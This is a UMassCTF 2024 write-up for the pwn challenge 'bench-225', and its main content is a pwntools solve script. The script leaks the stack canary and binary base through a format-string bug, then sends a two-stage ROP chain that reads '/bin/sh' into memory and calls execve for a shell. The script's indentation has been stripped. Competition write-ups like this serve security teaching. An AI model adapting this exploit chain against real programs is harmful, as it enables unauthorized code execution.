---
title: "bench-225 - UMassCTF 2024"
category: "pwn"
subcategory: "rop"
type: "writeup"
tags: ["exploit", "buffer", "pwn", "leak", "overflow", "rop", "canary", "pwndbg", "checksec", "umassctf", "umassctf-2024", "2024", "ctf-writeup"]
summary: "A detailed writeup can be found here."
source:
  name: "CTFtime writeup #39127"
  url: "https://ctftime.org/writeup/39127"
original_source: "https://ihuomtia.onrender.com/umass-pwn-bench-225"
ctf:
  name: "UMassCTF 2024"
  year: 2024
  challenge: "bench-225"
---

## Metadata

- **CTF:** UMassCTF 2024
- **Task:** bench-225
- **Author team:** PH4NT0MS
- **CTFtime tags:** exploit, buffer, pwn, leak, overflow
- **CTFtime:** <https://ctftime.org/writeup/39127>
- **Original writeup:** <https://ihuomtia.onrender.com/umass-pwn-bench-225>

---
## Full Writeup  
A detailed writeup can be found [here](<https://ihuomtia.onrender.com/umass-pwn-bench-225>).

## Solve script  
```python  
from pwn import *  
  
def start(argv=[], *a, **kw):  
if args.GDB: # Set GDBscript below  
return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)  
elif args.REMOTE: # ('server', 'port')  
return remote(sys.argv[1], sys.argv[2], *a, **kw)  
else: # Run locally  
return process([exe] + argv, *a, **kw)  
  
gdbscript = '''  
init-pwndbg  
'''.format(**locals())  
  
exe = './bench-225'  
elf = context.binary = ELF(exe, checksec=False)  
context.log_level = 'info'  
  
io = start()  
  
# setup the program to get the vulnerable option  
for i in range(5):  
io.recvuntil(b"5. Remove Plate")  
io.sendline(b"3")  
  
for i in range(6):  
io.recvuntil(b"5. Remove Plate")  
io.sendline(b"4")  
  
# leak addresses   
def leak_address(offset):  
io.recvuntil(b"6. Motivational Quote")  
io.sendline(b"6")  
  
io.recvuntil(b"Enter your motivational quote:")  
io.sendline(f"%{offset}$p".encode("ascii"))  
  
address = int(io.recvuntil(b" - Gary Goggins").split(b":")[1].replace(b"\"", b"").replace(b"\n", b"").split(b"-")[0].strip(), 16)  
return address  
  
canary = leak_address(33)  
log.success(f"canary: 0x{canary:x}")  
  
elf.address = leak_address(17) - elf.symbols['main']  
log.success(f"elf base: 0x{elf.address:x}")  
  
writable_address = elf.address + 0x7150  
log.success(f"writable address: 0x{writable_address:x}")  
  
# preparing rop gadgets ---------------------------------------------  
POP_RDI = elf.address + 0x0000000000001336  
POP_RSI = elf.address + 0x000000000000133a  
POP_RDX = elf.address + 0x0000000000001338  
POP_RAX = elf.address + 0x0000000000001332  
SYSCALL = elf.address + 0x000000000000133e  
RET = elf.address + 0x000000000000101a  
  
# first stage ---------------------------------------------  
payload = flat([  
cyclic(8),  
p64(canary),  
cyclic(8),  
p64(RET),  
p64(POP_RSI),  
p64(writable_address),  
p64(POP_RDI),  
p64(0),  
p64(POP_RDX),  
p64(0xff),  
p64(POP_RAX),  
p64(0),  
p64(SYSCALL),  
p64(RET),  
p64(elf.symbols['motivation'])  
])  
  
io.recvuntil(b"6. Motivational Quote")  
io.sendline(b"6")  
io.recvuntil(b"Enter your motivational quote:")  
  
io.clean()  
  
io.sendline(payload)  
io.sendline(b"/bin/sh\x00")  
  
# Second Stage ---------------------------------------------  
payload = flat([  
cyclic(8),  
p64(canary),  
cyclic(8),  
p64(RET),  
p64(POP_RDI),  
p64(writable_address),  
p64(POP_RSI),  
p64(0),  
p64(POP_RDX),  
p64(0),  
p64(POP_RAX),  
p64(0x3b),  
p64(SYSCALL),  
])  
  
io.recvuntil(b"Enter your motivational quote:")  
io.sendline()  
io.sendline(payload)  
  
io.clean()  
  
# Got Shell?  
io.interactive()  
```
